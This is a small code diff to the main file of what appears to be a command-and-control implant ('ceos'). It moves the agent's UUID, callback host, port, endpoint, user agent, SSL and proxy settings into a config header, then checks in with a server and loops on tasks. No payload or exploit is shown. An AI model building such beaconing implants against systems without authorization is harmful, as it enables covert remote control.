@@ -2,13 +2,23 @@
 //
 
 #include "ceos.h"
+#include "Config.h"
 
 CONFIG_CEOS* ceosConfig = (CONFIG_CEOS*)LocalAlloc(LPTR, sizeof(CONFIG_CEOS));
 
 int main()
 {
+    // Config Init
+    ceosConfig->agentID = (PCHAR)initUUID;
+    ceosConfig->hostName = (PWCHAR)hostname;
+    ceosConfig->httpPort = port;
+    ceosConfig->endPoint = (PWCHAR)endpoint;
+    ceosConfig->userAgent = (PWCHAR)useragent;
+    ceosConfig->httpMethod = (PWCHAR)httpmethod;
+    ceosConfig->isSSL = ssl;
+    ceosConfig->isProxyEnabled = proxyenabled;
+    ceosConfig->proxyURL = (PWCHAR)proxyurl;
 
-    ceosConfig->agentID = (PCHAR)"3d39a1b4-413e-4015-8690-f311c024a867";
 
     PParser ResponseParser = checkin();
     parseCheckin(ResponseParser);
@@ -16,10 +26,6 @@ int main()
         routine();
 }
 
-PCHAR getUUID()
-{
-    return ceosConfig->agentID;
-}
 
 VOID setUUID(PCHAR newUUID)
 {
